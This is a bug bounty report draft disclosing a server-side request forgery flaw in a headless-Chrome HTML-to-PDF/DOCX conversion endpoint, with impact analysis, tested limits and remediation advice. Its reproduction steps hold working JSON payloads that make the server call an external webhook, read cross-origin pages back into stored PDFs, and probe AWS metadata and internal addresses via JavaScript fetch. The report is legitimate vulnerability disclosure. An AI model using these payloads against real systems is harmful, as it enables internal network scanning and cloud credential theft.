# BUG-006 — SUBMISSION DRAFT (Bugcrowd, ready to paste)

**Title:** SSRF in HTML→PDF/DOCX conversion (`POST /api/v1/attachments/html`): server-side HeadlessChrome executes attacker JS, fetches arbitrary URLs, renders external content into stored documents, and reaches AWS link-local metadata

**Target:** https://bugbounty1.qe.optrostaging.ai — `POST /api/v1/attachments/html` (also affects `POST/PUT /api/v1/document_intelligence/attachment`, same conversion backend)

**Requested severity:** P3 (Functional SSRF with internal reachability oracle + external readback; no credential theft demonstrated — see "Tested and excluded")

**Reporter:** zeno0

---

## Summary

The authenticated endpoint `POST /api/v1/attachments/html` converts an attacker-supplied HTML string into a stored PDF or DOCX attachment. The conversion backend is server-side HeadlessChrome/155 (Skia/PDF) that loads the HTML via `page.setContent()` and executes it with JavaScript enabled. This gives an authenticated user a persistent, server-side browser primitive:

1. The renderer **executes attacker JavaScript** during conversion (confirmed — DOM writes painted into the PDF, JS-initiated network loads observed).
2. The renderer **fetches arbitrary attacker-chosen URLs** from the server's network position (confirmed — outbound GET callbacks to an external webhook from both `pdf` and `word` pipelines).
3. Cross-origin content can be **read back into the stored document** (confirmed — the full body text of `https://example.com/` painted into the generated PDF via `<iframe>`; no CORS involvement).
4. The renderer **reaches AWS link-local metadata** (`169.254.169.254`) — all probed paths answer (root, ami-id, IAM role listing path, token endpoint). The instance is IMDSv2-only (401 with empty bodies), which currently blocks credential theft.
5. JS + `fetch(..., {mode:'no-cors'})` + timing yields a **full internal liveness/port oracle** (open vs closed vs filtered distinguishable), and all probe results can be written into the rendered document — giving an internal-network scan whose results are returned to the attacker as a stored PDF.

A second, Ruby-side fetcher (the DOCX pipeline) additionally downloads `<img src>` URLs server-side (Ruby Net::HTTP fingerprints), extending the primitive to non-Chrome egress.

## Steps to Reproduce (copy-paste)

1. Create the conversion (any writable `attachable` works; `Narrative` id 62 shown):

```
POST /api/v1/attachments/html HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 231:<redacted>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"html":"<html><head><title>ssrf-POC</title></head><body><h1>ssrf-poc</h1><img src=\"https://webhook.site/d5ca52ae-fe37-478e-9d77-7501ac90b9b2?ssrf=pdf\"><iframe src=\"https://example.com/\" style=\"width:900px;height:300px\"></iframe><script>new Image().src='https://webhook.site/d5ca52ae-fe37-478e-9d77-7501ac90b9b2?ssrf=js';</script></body></html>","type":"pdf","fileName":"ssrf-poc.pdf","attachableType":"Narrative","attachableId":62,"fileTags":["scoping-memo"]}
```

Response: `200 {"attachmentId":<id>,"fileName":"ssrf-poc.pdf","type":"file"}`

2. Read back the proof:
   - `GET /api/v1/attachments/<attachmentId>` → `file_id`
   - `GET /api/v1/files/<file_id>` → presigned S3 URL → download the PDF
   - The PDF contains the painted example.com content (cross-origin readback) and `JSRUN` markers from executed script.
   - The webhook endpoint shows the server-side GETs (source egress: AWS us-west-2, 34.214.1.78).

3. Internal reachability oracle (single request, results painted into the returned PDF):

```
{"html":"<html><body><script>const t=['http://169.254.169.254/','http://172.31.0.10:3000/'];(async()=>{const r=await Promise.all(t.map(async u=>{try{await fetch(u,{mode:'no-cors',signal:AbortSignal.timeout(2500)});return u+' REACHABLE'}catch(e){return u+' dead'}}));document.body.innerHTML='<pre>'+r.join('\\n')+'</pre>';})()</script></body></html>","type":"pdf","fileName":"oracle.pdf","attachableType":"Narrative","attachableId":62}
```

4. IMDS reachability: inside the same JS, `fetch('http://169.254.169.254/latest/meta-data/',{mode:'no-cors'})` resolves (HTTP answer), while IMDSv2 token acquisition (`PUT /latest/api/token` with custom header) is blocked by CORS from the `about:blank` origin — responses exist but bodies are empty (IMDSv2 enforced).

## Impact

- An authenticated user can make the server issue arbitrary HTTP(S) requests (GET plus whatever the JS context allows) and persist externally-fetched content into application storage — a functional, artifact-producing SSRF.
- Full internal liveness/port oracle from an internet-reachable foothold, with results exfiltrated via the stored PDF.
- The renderer's network position reaches AWS link-local metadata (169.254.169.254). IMDSv2 currently blocks token theft; any fleet instance with IMDSv1, or any CORS-reflecting internal service, would upgrade this to full-read SSRF.
- The DOCX pipeline adds a second, non-browser fetcher (Ruby) with the same arbitrary-URL egress.

## Tested and excluded (honest boundaries)

- LFI: `file://` blocked by the renderer's origin policy; the Ruby fetcher is HTTP-only. Not found.
- RCE: no CDP (9222) or Node inspector (9229) reachable; no local services on the converter's Docker network (172.20.0.0/16 scanned — gateway and self-IP RST everything, no Redis/PG/ES).
- VPC lateral movement: all RFC1918 ranges blackholed from the renderer (timeout, no route); `*.compute.internal` DNS unanswered. The worker is egress-isolated — this is why the issue stays P3.
- XXE: HTML parser used, entities not processed.
- Credential theft: IMDSv2 enforced (401 empty), ECS agent endpoint filtered.

## Remediation suggestions

- Egress-allowlist the conversion worker (S3-only), deny link-local/IMDS ranges at the network layer, keep IMDSv2 + hop limit.
- Disable JavaScript in the renderer (`--disable-javascript`) or sanitize HTML before conversion; strip remote resources.
- Add per-request conversion isolation (fresh profile/container), and a timeout on the single-flight conversion lock (a single malformed `document_intelligence` request currently wedges the global DOCX pipeline indefinitely — 409 "fileable_type must be unique" for all subsequent conversions until worker restart).
